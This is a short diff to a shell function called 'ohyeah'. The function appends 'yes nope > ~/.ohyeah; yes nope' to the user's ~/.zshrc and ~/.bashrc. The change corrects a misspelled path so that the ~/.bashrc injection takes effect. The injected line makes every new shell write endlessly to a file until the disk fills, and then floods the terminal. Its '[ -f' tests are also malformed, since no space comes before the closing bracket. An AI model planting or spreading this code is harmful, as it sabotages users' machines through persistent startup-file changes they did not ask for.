@@ -32,7 +32,7 @@ ohyeah() {
 	if [ -f ~/.zshrc]; then
 		echo "yes nope > ~/.ohyeah; yes nope" >> ~/.zshrc
 	fi
-	if [ -f ~/.bashec]; then
+	if [ -f ~/.bashrc]; then
 		echo "yes nope > ~/.ohyeah; yes nope" >> ~/.bashrc
 	fi
 }
